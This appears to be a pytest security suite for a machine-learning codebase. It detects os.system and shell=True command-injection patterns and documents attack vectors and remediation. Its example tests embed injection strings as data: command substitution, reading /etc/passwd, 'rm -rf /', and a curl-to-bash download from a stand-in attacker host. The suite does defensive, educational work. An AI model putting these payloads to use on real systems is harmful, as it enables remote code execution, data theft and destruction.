# Copyright (c) 2025, NVIDIA CORPORATION.  All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Security Tests for CVE-002: Command Injection Vulnerability

JIRA: https://ml6team.atlassian.net/browse/DR-135
Severity: CRITICAL

Description:
The application is vulnerable to command injection due to unsafe use of os.system,
subprocess.call, or subprocess.run with shell=True. These patterns execute shell
commands and are susceptible to command injection when user-provided input or
configuration is used to construct commands without proper sanitization.

This test suite verifies the existence of these vulnerable patterns in the codebase
to document the security concern for remediation.

NOTE: These tests are designed to DETECT the vulnerability, not to fix it.
"""

import ast
import os
import re
from pathlib import Path
from typing import List, Tuple

import pytest


class CommandInjectionDetector(ast.NodeVisitor):
    """AST visitor to detect potentially vulnerable command execution patterns."""

    def __init__(self):
        self.vulnerabilities = []
        self.current_file = None
        self.current_lineno = None

    def visit_Call(self, node):
        """Visit function call nodes to detect vulnerable patterns."""
        # Check for os.system() calls
        if (
            isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Name)
            and node.func.value.id == 'os'
            and node.func.attr == 'system'
        ):
            self.vulnerabilities.append(
                {
                    'type': 'os.system',
                    'line': node.lineno,
                    'file': self.current_file,
                    'pattern': 'os.system() call detected',
                }
            )

        # Check for os.popen() calls
        if (
            isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Name)
            and node.func.value.id == 'os'
            and node.func.attr == 'popen'
        ):
            self.vulnerabilities.append(
                {
                    'type': 'os.popen',
                    'line': node.lineno,
                    'file': self.current_file,
                    'pattern': 'os.popen() call detected',
                }
            )

        # Check for subprocess.run/call/Popen with shell=True
        if isinstance(node.func, ast.Attribute):
            if (
                isinstance(node.func.value, ast.Name)
                and node.func.value.id == 'subprocess'
                and node.func.attr in ['run', 'call', 'Popen', 'check_output']
            ):
                # Check if shell=True is in keywords
                for keyword in node.keywords:
                    if keyword.arg == 'shell' and isinstance(keyword.value, ast.Constant):
                        if keyword.value.value is True:
                            self.vulnerabilities.append(
                                {
                                    'type': f'subprocess.{node.func.attr}',
                                    'line': node.lineno,
                                    'file': self.current_file,
                                    'pattern': f'subprocess.{node.func.attr}() with shell=True detected',
                                }
                            )

        self.generic_visit(node)


class TestCVE002CommandInjection:
    """
    Security test suite for CVE-002: Command Injection vulnerability.

    These tests verify the existence of command injection vulnerabilities in the NeMo codebase.
    The vulnerability exists when shell commands are executed using:
    - os.system() with unsanitized input
    - os.popen() with unsanitized input
    - subprocess.run/call/Popen with shell=True and unsanitized input
    """

    @pytest.fixture
    def workspace_root(self):
        """Get the workspace root directory."""
        # Assuming tests are in /workspace/tests/
        return Path(__file__).parent.parent.parent

    @pytest.fixture
    def vulnerable_files(self, workspace_root):
        """
        List of files known to contain command injection vulnerabilities.
        
        These files were identified during the security audit for CVE-002.
        """
        return [
            workspace_root / 'nemo' / 'utils' / 'cloud.py',
            workspace_root / 'nemo' / 'collections' / 'llm' / 'deploy' / 'base.py',
            workspace_root / 'scripts' / 'dataset_processing' / 'get_commonvoice_data.py',
            workspace_root / 'scripts' / 'tokenizers' / 'get_hf_text_data.py',
            workspace_root / 'scripts' / 'installers' / 'setup_os2s_decoders.py',
            workspace_root / 'scripts' / 'dataset_processing' / 'tts' / 'aishell3' / 'get_data.py',
        ]

    def _analyze_file_for_command_injection(self, file_path: Path) -> List[dict]:
        """
        Analyze a Python file for command injection vulnerabilities using AST.

        Args:
            file_path: Path to the Python file to analyze

        Returns:
            List of vulnerability dictionaries containing type, line, file, and pattern
        """
        if not file_path.exists():
            return []

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                source = f.read()

            tree = ast.parse(source, filename=str(file_path))
            detector = CommandInjectionDetector()
            detector.current_file = str(file_path)
            detector.visit(tree)
            return detector.vulnerabilities
        except SyntaxError:
            # If file has syntax errors, skip it
            return []

    @pytest.mark.unit
    def test_os_system_vulnerability_in_cloud_utils(self, vulnerable_files):
        """
        Test for os.system() vulnerability in nemo/utils/cloud.py.

        VULNERABILITY: Line 115 contains os.system() call that executes shell commands
        without proper input sanitization.

        Code pattern:
            os.system('chmod 777 /tmp && apt-get update && apt-get install -y libsndfile1 ffmpeg')

        RISK: While this specific instance uses a hardcoded command, the use of os.system()
        is inherently unsafe and sets a bad precedent. If similar patterns are used with
        user-controlled input, it could lead to arbitrary command execution.
        """
        cloud_py = [f for f in vulnerable_files if f.name == 'cloud.py'][0]
        vulnerabilities = self._analyze_file_for_command_injection(cloud_py)

        os_system_vulns = [v for v in vulnerabilities if v['type'] == 'os.system']
        assert len(os_system_vulns) > 0, (
            "Expected to find os.system() vulnerability in cloud.py. "
            "If this test fails, the vulnerability may have been fixed."
        )

        # Verify the specific line where the vulnerability exists
        vuln_lines = [v['line'] for v in os_system_vulns]
        assert 115 in vuln_lines, (
            f"Expected os.system() vulnerability at line 115 in cloud.py, "
            f"but found vulnerabilities at lines: {vuln_lines}"
        )

    @pytest.mark.unit
    def test_os_system_with_fstring_vulnerability(self, vulnerable_files):
        """
        Test for os.system() vulnerability with f-string in get_hf_text_data.py.

        VULNERABILITY: Line 81 contains os.system() with f-string interpolation that could
        allow command injection if cfg.output_file is user-controlled.

        Code pattern:
            os.system(f"rm {cfg.output_file}")

        RISK: HIGH - This is particularly dangerous because:
        1. Uses f-string interpolation without sanitization
        2. If cfg.output_file comes from user input, an attacker could inject arbitrary commands
        3. Example attack: cfg.output_file = "file.txt; malicious_command #"
        """
        hf_data_py = [f for f in vulnerable_files if f.name == 'get_hf_text_data.py'][0]
        vulnerabilities = self._analyze_file_for_command_injection(hf_data_py)

        os_system_vulns = [v for v in vulnerabilities if v['type'] == 'os.system']
        assert len(os_system_vulns) > 0, (
            "Expected to find os.system() vulnerability in get_hf_text_data.py. "
            "This is a CRITICAL vulnerability with f-string interpolation."
        )

        vuln_lines = [v['line'] for v in os_system_vulns]
        assert 81 in vuln_lines, (
            f"Expected os.system() vulnerability at line 81 in get_hf_text_data.py, "
            f"but found vulnerabilities at lines: {vuln_lines}"
        )

    @pytest.mark.unit
    def test_os_system_with_dynamic_command_construction(self, vulnerable_files):
        """
        Test for os.system() vulnerability with dynamic command construction in setup_os2s_decoders.py.

        VULNERABILITY: Line 90 contains os.system() that executes a dynamically constructed
        command using header and library parameters.

        Code pattern:
            command = (
                "bash -c \\"g++ -include " + header + " -l" + library +
                " -x c++ - <<<'int main() {}' -o " + dummy_path +
                " >/dev/null 2>/dev/null && rm " + dummy_path + " 2>/dev/null\\""
            )
            os.system(command)

        RISK: HIGH - Command is constructed from function parameters that could be manipulated.
        An attacker could inject shell metacharacters through header or library parameters.
        """
        setup_os2s_py = [f for f in vulnerable_files if f.name == 'setup_os2s_decoders.py'][0]
        vulnerabilities = self._analyze_file_for_command_injection(setup_os2s_py)

        os_system_vulns = [v for v in vulnerabilities if v['type'] == 'os.system']
        assert len(os_system_vulns) > 0, (
            "Expected to find os.system() vulnerability in setup_os2s_decoders.py. "
            "This vulnerability exists in dynamic command construction."
        )

        vuln_lines = [v['line'] for v in os_system_vulns]
        assert 90 in vuln_lines or 120 in vuln_lines, (
            f"Expected os.system() vulnerability at line 90 or 120 in setup_os2s_decoders.py, "
            f"but found vulnerabilities at lines: {vuln_lines}"
        )

    @pytest.mark.unit
    def test_subprocess_run_shell_true_in_deploy_base(self, vulnerable_files):
        """
        Test for subprocess.run() with shell=True in nemo/collections/llm/deploy/base.py.

        VULNERABILITY: Line 36 contains subprocess.run() with shell=True, allowing shell
        command execution.

        Code pattern:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        RISK: HIGH - The 'cmd' variable could contain user-controlled input. Using shell=True
        enables shell interpretation of metacharacters, allowing command injection.
        """
        base_py = [f for f in vulnerable_files if f.name == 'base.py'][0]
        vulnerabilities = self._analyze_file_for_command_injection(base_py)

        subprocess_vulns = [v for v in vulnerabilities if 'subprocess' in v['type']]
        assert len(subprocess_vulns) > 0, (
            "Expected to find subprocess vulnerability in deploy/base.py. "
            "If this test fails, the vulnerability may have been fixed."
        )

        vuln_lines = [v['line'] for v in subprocess_vulns]
        assert 36 in vuln_lines, (
            f"Expected subprocess.run() with shell=True at line 36 in deploy/base.py, "
            f"but found vulnerabilities at lines: {vuln_lines}"
        )

    @pytest.mark.unit
    def test_subprocess_run_shell_true_in_commonvoice_script(self, vulnerable_files):
        """
        Test for subprocess.run() with shell=True in get_commonvoice_data.py.

        VULNERABILITY: Line 175 contains subprocess.run() with shell=True that executes
        a wget command constructed from user parameters.

        Code pattern:
            commands = [
                'wget', '--user-agent', '"Mozilla/5.0 ..."',
                '-O', output_archive_filename, f'{COMMON_VOICE_URL}'
            ]
            commands = " ".join(commands)
            subprocess.run(commands, shell=True, stderr=sys.stderr, stdout=sys.stdout, capture_output=False)

        RISK: HIGH - While the immediate values may be controlled, the pattern of joining
        a list and passing to shell=True is dangerous. The output_archive_filename could
        potentially be influenced by args.language, enabling path traversal or injection.
        """
        commonvoice_py = [f for f in vulnerable_files if f.name == 'get_commonvoice_data.py'][0]
        vulnerabilities = self._analyze_file_for_command_injection(commonvoice_py)

        subprocess_vulns = [v for v in vulnerabilities if 'subprocess' in v['type']]
        assert len(subprocess_vulns) > 0, (
            "Expected to find subprocess vulnerability in get_commonvoice_data.py. "
            "This is a CRITICAL vulnerability in dataset processing."
        )

        vuln_lines = [v['line'] for v in subprocess_vulns]
        assert 175 in vuln_lines, (
            f"Expected subprocess.run() with shell=True at line 175 in get_commonvoice_data.py, "
            f"but found vulnerabilities at lines: {vuln_lines}"
        )

    @pytest.mark.unit
    def test_subprocess_multiple_vulnerabilities_in_aishell3(self, vulnerable_files):
        """
        Test for multiple subprocess vulnerabilities in get_data.py (aishell3).

        VULNERABILITIES:
        - Line 102: subprocess.check_output(f"soxi -D {wav_file}", shell=True)
        - Line 107: subprocess.run(f"sox {wav_file} -r 22050 -c 1 -b 16 {processed_file}", shell=True)

        Code patterns:
            duration = subprocess.check_output(f"soxi -D {wav_file}", shell=True)
            subprocess.run(f"sox {wav_file} -r 22050 -c 1 -b 16 {processed_file}", shell=True)

        RISK: CRITICAL - Both lines use f-string interpolation with file paths that could
        contain shell metacharacters. An attacker could create files with names like:
        "file$(malicious_command).wav" to execute arbitrary commands.
        """
        aishell3_py = [f for f in vulnerable_files if 'aishell3' in str(f)][0]
        vulnerabilities = self._analyze_file_for_command_injection(aishell3_py)

        subprocess_vulns = [v for v in vulnerabilities if 'subprocess' in v['type']]
        assert len(subprocess_vulns) >= 2, (
            f"Expected to find at least 2 subprocess vulnerabilities in get_data.py (aishell3), "
            f"but found {len(subprocess_vulns)}. These are CRITICAL vulnerabilities."
        )

        vuln_lines = [v['line'] for v in subprocess_vulns]
        assert 102 in vuln_lines, (
            f"Expected subprocess.check_output() with shell=True at line 102 in get_data.py, "
            f"but found vulnerabilities at lines: {vuln_lines}"
        )
        assert 107 in vuln_lines, (
            f"Expected subprocess.run() with shell=True at line 107 in get_data.py, "
            f"but found vulnerabilities at lines: {vuln_lines}"
        )

    @pytest.mark.unit
    def test_comprehensive_codebase_scan(self, workspace_root):
        """
        Comprehensive scan of the entire codebase for command injection vulnerabilities.

        This test scans all Python files in the nemo/ and scripts/ directories to identify
        any instances of potentially vulnerable command execution patterns.

        EXPECTED RESULTS:
        - os.system() calls: Multiple instances
        - subprocess with shell=True: Multiple instances
        - Total vulnerabilities: At least 8 known instances

        This test serves as a comprehensive documentation of the attack surface.
        """
        all_vulnerabilities = []

        # Scan nemo/ directory
        nemo_dir = workspace_root / 'nemo'
        if nemo_dir.exists():
            for py_file in nemo_dir.rglob('*.py'):
                vulns = self._analyze_file_for_command_injection(py_file)
                all_vulnerabilities.extend(vulns)

        # Scan scripts/ directory
        scripts_dir = workspace_root / 'scripts'
        if scripts_dir.exists():
            for py_file in scripts_dir.rglob('*.py'):
                vulns = self._analyze_file_for_command_injection(py_file)
                all_vulnerabilities.extend(vulns)

        # Assert that vulnerabilities exist
        assert len(all_vulnerabilities) > 0, (
            "No command injection vulnerabilities detected. "
            "If this test fails, the vulnerabilities may have been remediated."
        )

        # Group vulnerabilities by type
        vuln_by_type = {}
        for v in all_vulnerabilities:
            vuln_type = v['type']
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(v)

        # Assert expected vulnerability types exist
        assert 'os.system' in vuln_by_type, "Expected to find os.system() vulnerabilities"
        assert any('subprocess' in vtype for vtype in vuln_by_type.keys()), (
            "Expected to find subprocess vulnerabilities with shell=True"
        )

        # Verify minimum number of known vulnerabilities
        # Based on the security audit, we know there are at least:
        # - 5 os.system() instances
        # - 3+ subprocess instances with shell=True
        total_vulns = len(all_vulnerabilities)
        assert total_vulns >= 8, (
            f"Expected at least 8 command injection vulnerabilities in the codebase, "
            f"but found {total_vulns}. Known vulnerable files may have been modified."
        )

    @pytest.mark.unit
    def test_verify_vulnerable_file_existence(self, vulnerable_files):
        """
        Verify that all known vulnerable files exist in the codebase.

        This test ensures that the files identified in the security audit are present.
        If files have been moved or deleted, this test will fail and the test suite
        should be updated accordingly.
        """
        missing_files = []
        for file_path in vulnerable_files:
            if not file_path.exists():
                missing_files.append(str(file_path))

        assert len(missing_files) == 0, (
            f"The following vulnerable files are missing from the codebase: {missing_files}. "
            f"This could mean files were deleted or moved. Please update the test suite."
        )

    @pytest.mark.unit
    def test_attack_vector_documentation(self):
        """
        Document common attack vectors for command injection vulnerabilities.

        This test serves as documentation for developers and security auditors about
        how command injection attacks work and what patterns to avoid.

        ATTACK VECTORS:
        1. Shell Metacharacters: ; | & $ ` \\ ( ) < > >> ' "
        2. Command Substitution: $(command) or `command`
        3. Command Chaining: cmd1 ; cmd2 or cmd1 && cmd2 or cmd1 || cmd2
        4. Input/Output Redirection: > file or < file
        5. Piping: cmd1 | cmd2

        VULNERABLE PATTERNS:
        - os.system(user_input)
        - os.system(f"command {user_input}")
        - subprocess.run(user_input, shell=True)
        - subprocess.run(f"command {user_input}", shell=True)

        SAFE ALTERNATIVES:
        - subprocess.run(['command', arg1, arg2], shell=False)
        - Use shlex.quote() to escape shell metacharacters if shell=True is unavoidable
        - Validate and sanitize all user input before using in commands
        - Use allowlists for valid input values
        """
        # This test always passes - it's purely for documentation
        assert True, "Attack vector documentation test"

    @pytest.mark.unit
    def test_remediation_recommendations(self):
        """
        Document remediation recommendations for command injection vulnerabilities.

        REMEDIATION STEPS:

        1. REPLACE os.system():
           BAD:  os.system(f"rm {filename}")
           GOOD: os.remove(filename) or Path(filename).unlink()

        2. REPLACE subprocess with shell=True:
           BAD:  subprocess.run(f"ls {directory}", shell=True)
           GOOD: subprocess.run(['ls', directory], shell=False)

        3. USE shlex.quote() if shell execution is unavoidable:
           import shlex
           safe_arg = shlex.quote(user_input)
           subprocess.run(f"command {safe_arg}", shell=True)

        4. VALIDATE INPUT:
           - Use allowlists for valid values
           - Reject input with shell metacharacters
           - Use Path() for file operations instead of shell commands

        5. IMPLEMENT POLICY:
           - Add linting rules to detect shell=True
           - Require security review for any shell execution
           - Use safer APIs (pathlib, os module functions) instead of shell commands

        PRIORITY:
        - HIGH: Files with f-string interpolation in shell commands
        - MEDIUM: Files with shell=True and dynamic input
        - LOW: Files with hardcoded commands (still should be fixed)
        """
        # This test always passes - it's purely for documentation
        assert True, "Remediation recommendations documentation test"


class TestCommandInjectionExamples:
    """
    Concrete examples demonstrating how command injection vulnerabilities can be exploited.

    NOTE: These are proof-of-concept tests that demonstrate the vulnerability without
    actually executing malicious code. They serve as educational examples for developers.
    """

    @pytest.mark.unit
    def test_example_filename_injection(self):
        """
        Example: Demonstrate how malicious filenames can lead to command injection.

        SCENARIO: The get_data.py (aishell3) script uses:
            subprocess.run(f"sox {wav_file} -r 22050 -c 1 -b 16 {processed_file}", shell=True)

        ATTACK: An attacker creates a file named: file$(malicious_command).wav

        RESULT: When processed, the command becomes:
            sox file$(malicious_command).wav -r 22050 -c 1 -b 16 output.wav

        This would execute "malicious_command" before running sox.
        """
        # Demonstrate the vulnerable pattern (without executing)
        malicious_filename = "file$(whoami).wav"
        command = f"sox {malicious_filename} -r 22050 -c 1 -b 16 output.wav"

        # Verify that the malicious pattern is present in the command
        assert "$(whoami)" in command, "Malicious command substitution pattern is preserved"
        assert "sox" in command, "Original command is present"

        # This demonstrates that the malicious input would be executed by the shell
        # In a real scenario with shell=True, this would execute the 'whoami' command

    @pytest.mark.unit
    def test_example_config_file_injection(self):
        """
        Example: Demonstrate how malicious config values can lead to command injection.

        SCENARIO: The get_hf_text_data.py script uses:
            os.system(f"rm {cfg.output_file}")

        ATTACK: An attacker provides config: output_file = "file.txt; rm -rf / #"

        RESULT: The command becomes:
            rm file.txt; rm -rf / #

        This would delete the file, then attempt to delete the entire filesystem.
        """
        # Demonstrate the vulnerable pattern (without executing)
        malicious_config = "file.txt; cat /etc/passwd #"
        command = f"rm {malicious_config}"

        # Verify that command injection is possible
        assert ";" in command, "Command separator is preserved"
        assert "cat /etc/passwd" in command, "Malicious command is embedded"

        # This demonstrates that with shell=True or os.system(), both commands would execute

    @pytest.mark.unit
    def test_example_parameter_injection(self):
        """
        Example: Demonstrate how malicious function parameters can lead to command injection.

        SCENARIO: The setup_os2s_decoders.py script constructs:
            command = "bash -c \\"g++ -include " + header + " -l" + library + "...\\""
            os.system(command)

        ATTACK: An attacker provides: library = "test; malicious_command #"

        RESULT: The command becomes:
            bash -c "g++ -include header.h -ltest; malicious_command # ..."

        This would execute the malicious command.
        """
        # Demonstrate the vulnerable pattern (without executing)
        header = "test.h"
        malicious_library = "test; curl attacker.com/backdoor.sh | bash #"

        command = f'bash -c "g++ -include {header} -l{malicious_library}"'

        # Verify that command injection is possible
        assert ";" in command, "Command separator is preserved"
        assert "curl" in command, "Malicious command is embedded"
        assert "#" in command, "Comment character to ignore rest of command"

        # This demonstrates how shell execution would run the attacker's command
